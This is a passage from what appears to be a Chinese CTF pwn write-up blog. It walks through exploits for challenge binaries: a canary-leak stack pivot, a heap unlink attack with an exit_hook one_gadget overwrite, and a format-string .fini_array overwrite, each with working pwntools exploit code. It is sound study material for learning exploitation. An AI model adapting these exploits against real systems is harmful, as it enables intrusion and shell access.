class="string">&quot;canary=&quot;</span>,p64(canary))</span><br><span class="line"></span><br><span class="line">rbp=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">stack=rbp-<span class="number">0x70</span></span><br><span class="line">bin_sh=stack-<span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp=&quot;</span>,<span class="built_in">hex</span>(rbp))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack=&quot;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary=&quot;</span>,p64(canary))</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(pop_rdi)+p64(stack)+p64(ret)+p64(<span class="number">0x401124</span>)+p64(<span class="number">0x401124</span>)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload1+=p32(<span class="number">0x1</span>)+<span class="string">b&#x27;bbbb&#x27;</span>+p64(canary)</span><br><span class="line">payload1+=p64(stack)+p64(leave_ret)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#bytes(str(hex(canary))</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="【复现】uheap"><a href="#【复现】uheap" class="headerlink" title="【复现】uheap"></a>【复现】uheap</h2><p>大佬出的题异构堆wp：<a href="https://pastebin.ubuntu.com/p/dqPRBSkdRJ/">https://pastebin.ubuntu.com/p/dqPRBSkdRJ/</a></p><h2 id="【复现】how2heap"><a href="#【复现】how2heap" class="headerlink" title="【复现】how2heap"></a>【复现】how2heap</h2><p>大佬出的题，完全不会，提醒着我不能停下学习了，加油！</p><h3 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h3><p>首先checksec 函数，没开pie，堆题常规保护</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697550735146-b78f2bef-8e9e-40d0-b9f0-8f0680884d8f.png" alt="img"></p><p>然后放进ida，菜单函数如下：</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697550762748-d653dead-5717-4590-aae1-2cef80249975.png" alt="img"></p><p>下面简述每个函数的功能:</p><ul><li>add: 一共只能申请9个chunk，大小在0-0x160之间，将地址存到bss段，将size存在bss段，同时将bss段的heap_flag置1</li><li>delete: free 9个chunk的其中一个，并且会将堆指针置零，heap_flag设置为2(这样我们不能再申请)</li><li>edit: 不能修改前面7个chunk，也就是那7个chunk只能用来填充，而且heap_flag为1，我们才能edit，用的是bss上存的size，没有溢出。</li><li>show: heap_flag为1才能show，也就是没漏洞</li></ul><h4 id="backdoor114514"><a href="#backdoor114514" class="headerlink" title="backdoor114514"></a>backdoor114514</h4><p>还有一个backdoor114514函数，漏洞就在这里，我们简单阐述一下：</p><p>只有chunk7（第8个chunk存在）才可能利用这个函数，一共分为两部分利用。</p><p><strong>一、将chance置为1，同时分配一个0x20的chunk给buf指针</strong></p><p><strong>二、将chance置为2，向buf上读入0x20字节数据，这里造成了堆溢出，可以覆盖pre_size和size</strong></p><p>（懂的都懂，就是不会构造，接下来跟着大佬wp来学习！）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">back</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)heap_8;</span><br><span class="line">  <span class="keyword">if</span> ( heap_8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( chance )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( chance != <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      chance = <span class="number">2</span>;</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">      result = (<span class="type">unsigned</span> __int64)&amp;puts;</span><br><span class="line">      qword_404060 = (__int64)&amp;puts;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      chance = <span class="number">1</span>;                               <span class="comment">// chance初始化为0</span></span><br><span class="line">      result = (<span class="type">unsigned</span> __int64)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      buf = (<span class="type">void</span> *)result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x2-大佬思路总结"><a href="#0x2-大佬思路总结" class="headerlink" title="0x2 大佬思路总结"></a>0x2 大佬思路总结</h3><p>我们一共能申请9个chunk，前面7个chunk（0-6）肯定是用来填满tcache的，我们只有申请第八个chunk，才能调用漏洞函数，我们应该如何构造呢？</p><p>首先肯定是要分配8个相同大小chunk，然后调用漏洞函数，此时会有9个chunk(其中一个是0x20大小的chunk_bug)在我们程序里，这时候申请最后一个（第9个）chunk。</p><p>释放前面7个chunk填满tceche，由于我们BSS段上存有堆指针，我们只要劫持了BSS段就能够操作堆函数任意读写，我们通过伪造fakechunk来实现unlink，使指向chunk7的指针P，指向&amp;P-0x18，这样就可以控制bss段上的chunk</p><p>然后泄露back114514的libc，通过覆盖exit_hook的后续函数来getshell</p><h3 id="0x3-调试"><a href="#0x3-调试" class="headerlink" title="0x3 调试"></a>0x3 调试</h3><p>首先肯定是要分配8个相同大小chunk，然后调用漏洞函数，此时会有9个chunk(其中一个是0x20大小的chunk_bug)在我们程序里，这时候申请最后一个（第9个）chunk。</p><p>此时堆布局如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">add</span>(<span class="number">0xb0</span>,b<span class="number">&#x27;</span>xswlhhhaaaaaaaaaaaaaa<span class="number">&#x27;</span>)#<span class="number">7</span></span><br><span class="line"><span class="built_in">cmd</span>(<span class="number">114514</span>)   # <span class="number">7</span> _ &amp; _ <span class="number">8</span></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xb0</span>,b<span class="number">&#x27;b</span>bbbbbbbbbbbbbb<span class="number">&#x27;</span>)#<span class="number">8</span></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">7</span>)</span>:</span></span><br><span class="line"><span class="function">delete(str(i))</span></span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697551934381-7cbe3a91-8cf4-4b47-906c-70a4290db5bb.png" alt="img"></p><hr><p>然后利用chunk_bug修改chunk8的pre和size。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span>(<span class="number">114514</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=<span class="built_in">p64</span>(<span class="number">0xd0</span>)+<span class="built_in">p64</span>(<span class="number">0xc0</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(payload)</span><br><span class="line">gdb.<span class="built_in">attach</span>(p)</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697552842723-eb827dc9-4e35-4325-9142-c3293839f6c8.png" alt="img"></p><hr><p>为了达到unlink效果，当然我们要在chunk7上面伪造一个chunk，那它fakechunk的fd和bk我们要给什么呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="built_in">p64</span>(<span class="number">0</span>)+<span class="built_in">p64</span>(<span class="number">0xd1</span>)+<span class="built_in">p64</span>(<span class="number">0x4040b8</span><span class="number">-0x18</span>)+<span class="built_in">p64</span>(<span class="number">0x4040b8</span><span class="number">-0x10</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure><p>我们知道在bss段上存储了堆的指针，我们是否可以利用这些指针当做fd和bk来绕过循环？</p><p>而且这些指针刚好指向data区，也就是我们fakechunk的pre_size区。</p><p>首先我们fake.FD设置成0x4040a0也就是让右边区域的0x125f7e0为bk指向fakechunk的pre_size，</p><p>然后我们fake.BK设置成0x4040a8也就是让右边区域的0x125f7e0为fd指向fakechunk的pre_size。</p><ul><li><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697557308067-fab04b86-1e64-4688-91c3-19bf5a648bc9.jpeg" alt="img"></li></ul><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697557303940-57bd3e25-82a3-400d-bc85-f0f43947443e.jpeg" alt="img"></p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">delete</span>(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>我们此时释放chunk8，chunk8会检查fake.FD指向的(0x4040b8-0x18)chunk的bk是否指向fake.pre</p><p>同时检查fake.BK指向的(0x4040b8-0x10)chunk的fd是否指向fake.pre</p><p>很显然我们这里是通过的，检查chunk8的标志位为0和pre_size&#x3D;fake.size，触发向前合并操作（合并fake_chunk）。此时chunk3的首地址就是fakechunk，其fd和bk指针就是我们的p64(0x4040b8-0x18)+p64(0x4040b8-0x10)。</p><p>注意这里chunk8(第9chunk)free掉了，所以那里指针变成了0，chunk7指针本来指向chunk7，但是被unlink修改了（&amp;Ptr-0x18）。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697559233726-4fce5357-7c14-4982-91eb-0076e2dfc030.png" alt="img"><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697563091856-7a34fe21-bd4d-4bd2-8c32-86aa982e5fe3.jpeg" alt="img"></p><p>此时我们通过chunk7的write操作（chunk7_size&#x3D;0xb0）就可以在bss段上布置堆指针和heap_flag给我们利用了。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">3</span>+<span class="built_in">p64</span>(<span class="number">0x404060</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">7</span>,payload)</span><br><span class="line"><span class="built_in">show</span>(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>我们看看0x404060是哪里，它正好是back114514存储libc的地方，原来泄露libc是从这里泄露的</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697560172747-46731ac3-7750-4b0a-a343-8ed4c008634b.png" alt="img"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697560140630-48ceb9b8-d3b5-441b-a667-bd341a220381.png" alt="img"></p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ld_base=libc_base+<span class="number">0x1f4000</span></span><br><span class="line">_rtld_global=ld_base+ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line">_dl_rtld_lock_recursive=_rtld_global+<span class="number">0xf08</span></span><br><span class="line">_dl_rtld_unlock_recursive=_rtld_global+<span class="number">0xf10</span></span><br><span class="line"></span><br><span class="line">execve = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">execve[i] += libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;dl_recursive&quot;</span>,<span class="built_in">hex</span>(_dl_rtld_lock_recursive))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one=&quot;</span>,<span class="built_in">hex</span>(execve[<span class="number">0</span>]))</span><br><span class="line">payload=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">11</span>+<span class="built_in">p64</span>(_dl_rtld_lock_recursive)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">7</span>,payload)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">7</span>,<span class="built_in">p64</span>(execve[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">sendline</span>(b<span class="number">&#x27;6&#x27;</span>)</span><br></pre></td></tr></table></figure><p>接收完libc，我们就要算好我们要用的地址，覆盖exit_hook的后续调用函数(调用了 __rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive 。)为one_gadget来getshell</p><p><a href="https://www.cnblogs.com/bhxdn/p/14222558.html">有关文章</a></p><p>我们可以用p _rtld_global，然后慢慢找到我们想要的函数</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697562061697-0aeb4a71-cc93-42e0-b72c-a856688e6693.png" alt="img"></p><p>找到这两个函数了</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697562534759-4683f48a-e1c4-447b-96d0-8be6bdb27cbe.png" alt="img"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697562614425-c8648543-6ad2-4607-91f6-9d0e73999818.png" alt="img"></p><p>然后退出函数即可getshell，这里本地没有getshell，到时候问问怎么回事</p><p>调试发现最后堆指针指向了这里，看来是ld和libc偏移变了，我们改一下就行了（Ubunutu20.04）</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697564068390-0e768662-2efa-46c5-9058-9389f759367e.png" alt="img"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697564125575-06c2f4a6-5525-47f0-8438-2358d469c3ff.png" alt="img"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697564180394-10c8f765-976a-44a0-b065-33c700dd67fe.png" alt="img"></p><p>发现写错位置了，要15FF8+8&#x3D;16000，很好终于通了</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697564474516-fd8c07e6-fee3-4e29-8619-81e3a9db4f7c.png" alt="img"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697564518263-6c177203-bb7f-4a48-8be6-7fc7bf2fad77.png" alt="img"></p><h3 id="0x4-exp"><a href="#0x4-exp" class="headerlink" title="0x4 exp"></a>0x4 exp</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from pwn <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span></span><br><span class="line"><span class="function">p</span>=<span class="built_in">process</span>(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">elf=<span class="built_in">ELF</span>(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">libc=<span class="built_in">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">ld=<span class="built_in">ELF</span>(<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;43.248.97.200&quot;</span>,40061)</span></span><br><span class="line"></span><br><span class="line">bss_flag=<span class="number">0x4040E0</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">cmd</span>(cho):</span><br><span class="line">p.<span class="built_in">sendlineafter</span>(<span class="string">&#x27;please input your choice:&#x27;</span>,<span class="built_in">str</span>(cho))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,content):</span><br><span class="line"><span class="built_in">cmd</span>(<span class="number">1</span>)</span><br><span class="line">p.<span class="built_in">sendlineafter</span>(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.<span class="built_in">sendlineafter</span>(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">show</span>(idx):</span><br><span class="line"><span class="built_in">cmd</span>(<span class="number">4</span>)</span><br><span class="line">p.<span class="built_in">sendlineafter</span>(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">edit</span>(idx,content):</span><br><span class="line"><span class="built_in">cmd</span>(<span class="number">3</span>)</span><br><span class="line">p.<span class="built_in">sendlineafter</span>(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.<span class="built_in">sendafter</span>(<span class="string">&#x27;new content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">delete</span>(idx):</span><br><span class="line"><span class="built_in">cmd</span>(<span class="number">2</span>)</span><br><span class="line">p.<span class="built_in">sendlineafter</span>(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xb0</span>,b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xb0</span>,b<span class="number">&#x27;</span>xswlhhhaaaaaaaaaaaaaa<span class="number">&#x27;</span>)#<span class="number">7</span></span><br><span class="line"><span class="built_in">cmd</span>(<span class="number">114514</span>)   # <span class="number">7</span> _ &amp; _ <span class="number">8</span></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xb0</span>,b<span class="number">&#x27;b</span>bbbbbbbbbbbbbb<span class="number">&#x27;</span>)#<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line"><span class="built_in">delete</span>(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="built_in">cmd</span>(<span class="number">114514</span>)</span><br><span class="line"></span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=<span class="built_in">p64</span>(<span class="number">0xd0</span>)+<span class="built_in">p64</span>(<span class="number">0xc0</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(payload)</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">p64</span>(<span class="number">0</span>)+<span class="built_in">p64</span>(<span class="number">0xd1</span>)+<span class="built_in">p64</span>(<span class="number">0x4040b8</span><span class="number">-0x18</span>)+<span class="built_in">p64</span>(<span class="number">0x4040b8</span><span class="number">-0x10</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">7</span>,payload)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">3</span>+<span class="built_in">p64</span>(<span class="number">0x404060</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">7</span>,payload)</span><br><span class="line"><span class="built_in">show</span>(<span class="number">7</span>)</span><br><span class="line">puts_addr=<span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr=&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">ld_base=libc_base+<span class="number">0x1f4000</span></span><br><span class="line">_rtld_global=ld_base+ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line">_dl_rtld_lock_recursive=_rtld_global+<span class="number">0xf08</span>+<span class="number">0x16000</span></span><br><span class="line">_dl_rtld_unlock_recursive=_rtld_global+<span class="number">0xf10</span></span><br><span class="line"></span><br><span class="line">execve = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">execve[i] += libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;dl_recursive&quot;</span>,<span class="built_in">hex</span>(_dl_rtld_lock_recursive))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one=&quot;</span>,<span class="built_in">hex</span>(execve[<span class="number">0</span>]))</span><br><span class="line">payload=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">11</span>+<span class="built_in">p64</span>(_dl_rtld_lock_recursive)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">7</span>,payload)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">7</span>,<span class="built_in">p64</span>(execve[<span class="number">0</span>]))</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.<span class="built_in">sendline</span>(b<span class="number">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;dl_recursive&quot;</span>,<span class="built_in">hex</span>(_dl_rtld_lock_recursive))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one=&quot;</span>,<span class="built_in">hex</span>(execve[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure><h2 id="【复现】guess"><a href="#【复现】guess" class="headerlink" title="【复现】guess"></a>【复现】guess</h2><p>考点：TLS覆盖canary</p><h2 id="【复现】easy-pwn"><a href="#【复现】easy-pwn" class="headerlink" title="【复现】easy_pwn"></a>【复现】easy_pwn</h2><p>复现时间隔得有一个月了，太懒了，现在就来复现这个非栈上格式化字符串</p><p>程序只有个非栈上格式化字符串漏洞，而且只能使用两次，我们首先要修改这个次数限制。</p><h3 id="0x2-调试"><a href="#0x2-调试" class="headerlink" title="0x2 调试"></a>0x2 调试</h3><p>我们先看看我们的格式化字符串的偏移情况，可以看到偏移为6时(也就是nil数据)，刚好到栈上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.send(b<span class="number">&#x27;</span>%p %p %p %p %p  %p %p %p %p %p<span class="number">&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700224785748-2633bb39-0a8a-4b27-a21f-67913884fbca.png" alt="img"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700224764705-73d25227-5285-48fb-b022-abbce541bf5e.png" alt="img"></p><p>随后验证%6$p刚好是nil，没问题，接下来我们看看栈上的一些指针链。好像也没有我们能够利用的rbp指针链。</p><p>所以这题我们试试修改exit的后续函数。我们跟随ret，来到这个地方调用exit。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700225438020-22151f64-6e4a-47a7-a754-6c097b410a47.png" alt="img"></p><p>用gdb调试main函数的时候，不难发现main的返回地址是__libc_start_main也就是说main并不是程序真正开始的地方，__libc_start_main的执行是在main的前面。</p><p>可以发现__libc_start_main函数的参数中，有3个是函数指针：</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700226279354-00d7e33a-eb8d-4d0e-bb1a-d9add3144acc.png" alt="img"></p><p>其中__libc_csu_fini是在main执行完毕后执行的</p><p>程序结束时会调用_fini_array指向的函数指针，所以我们将其修改为main的地址就会循环调用了</p><p>简单地说，在main函数后会调用.init段代码和.init_array段的函数数组中每一个函数指针。而我们的目标就是修改.fini_array数组的第一个元素为start。需要注意的是，这个数组的内容在再次从start开始执行后又会被修改，且程序可读取的字节数有限，因此需要一次性修改两个地址并且合理调整payload。</p><details class="lake-collapse"><summary id="u621a7425"><span class="ne-text" style="font-size: 16px">一种ROP攻击思路</span></summary><p id="uf410943a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><img src="https://cdn.nlark.com/yuque/0/2023/png/33556483/1700226112422-a8fb5b1d-0ed2-4278-8d26-f937bb7cf4b6.png" width="422" id="nPprW" class="ne-image"></p></details><p>所以这题我们的目的还是要改_fini_array，位于0x403e18-0x403e20的位置</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700228201444-4ba0a5c6-1559-4999-948b-0a2daee9f89f.png" alt="img"></p><p>我们注意到此处刚好就是这个_fini_array的位置</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700228370298-f7148bab-ec13-4685-978e-3d995a54d937.png" alt="img"></p><p>我们改它为我们的main函数地址，同时泄露libc地址和栈地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Today the store is on sale, do you want to shop?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">#################<span class="meta">#</span></span><br><span class="line"><span class="meta">p.recvuntil(<span class="string">&quot;What do you want to buy?&quot;</span>)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">p.send(b<span class="number">&#x27;</span>%<span class="number">150</span>c%<span class="number">8</span>$hhn+%<span class="number">11</span>$p-%<span class="number">13</span>$p<span class="number">&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&quot;+0x&quot;</span>)</span><br><span 